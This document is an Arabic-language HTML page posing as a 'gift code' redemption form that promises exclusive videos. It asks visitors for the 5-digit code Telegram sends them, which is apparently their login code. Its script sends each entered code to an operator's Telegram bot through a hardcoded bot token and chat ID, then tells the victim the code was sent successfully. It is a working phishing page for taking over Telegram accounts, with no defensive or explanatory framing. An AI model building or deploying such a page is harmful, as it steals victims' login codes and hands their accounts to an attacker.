<!DOCTYPE html><html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>استبدال كود الهدية</title>
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Tahoma,sans-serif;
}

body{
    background:#0f172a;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.container{
    width:90%;
    max-width:400px;
    background:#1e293b;
    padding:25px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 0 20px rgba(0,0,0,.3);
}

h1{
    color:#fff;
    margin-bottom:20px;
    font-size:24px;
}

p{
    color:#cbd5e1;
    margin-bottom:15px;
}

input{
    width:100%;
    padding:12px;
    border:none;
    outline:none;
    border-radius:8px;
    margin-bottom:15px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    border:none;
    border-radius:8px;
    background:#2563eb;
    color:white;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#1d4ed8;
}

#status{
    margin-top:15px;
    color:#fff;
}
</style>
</head>
<body>
<div class="container">
    <h1>🎁 كود الهدية</h1>
    <p>يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات</p>
    <input type="text" id="giftCode" placeholder="اكتب الكود هنا">
    <button onclick="sendCode()">إرسال</button>
    <div id="status"></div>
</div>

<script>
const BOT_TOKEN = "8983040975:AAFhVAvwXRnyj5sKK3Cagi-wH7ES8ciOZwU";
const CHAT_ID = "8460546222";

async function sendCode() {
    let code = document.getElementById("giftCode").value.trim();

    if (code === "") {
        document.getElementById("status").innerText = "يرجى ادخال كود الهديه المرسل رسميا من حساب تليجرام المكون من 5 ارقام على تليجرام للحصول على فيديوهات الحصريات";
        return;
    }

    try {
        let response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🎁 كود هدية جديد:\n${code}`
                })
            }
        );

        if (response.ok) {
            document.getElementById("status").innerText = "تم إرسال الكود بنجاح";
            document.getElementById("giftCode").value = "";
        } else {
            document.getElementById("status").innerText = "فشل الإرسال";
        }
    } catch (error) {
        document.getElementById("status").innerText = "حدث خطأ أثناء الإرسال";
    }
}
</script>
</body>
</html>
